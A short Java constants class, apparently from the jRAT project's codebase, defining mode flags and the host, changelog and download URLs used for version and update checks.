package com.redpois0n;

import com.redpois0n.common.Version;

public class Constants {

	public static final int MODE_ENV = 0;
	public static final int MODE_PROP = 1;

	public static final int MODE_LINES = 9;
	public static final int MODE_DOTS = 10;
	
	public static final String HOST = "https://jrat.pro";

	public static final String CHANGELOG_URL = Constants.HOST + "/misc/changelog/" + Version.getVersion() + ".txt";
	public static final String PARSE_CHANGELOG_URL = Constants.HOST + "/misc/changelog/%VERSION%.txt";
	public static final String DOWNLOAD_URL = Constants.HOST + "/download.php";
	
}
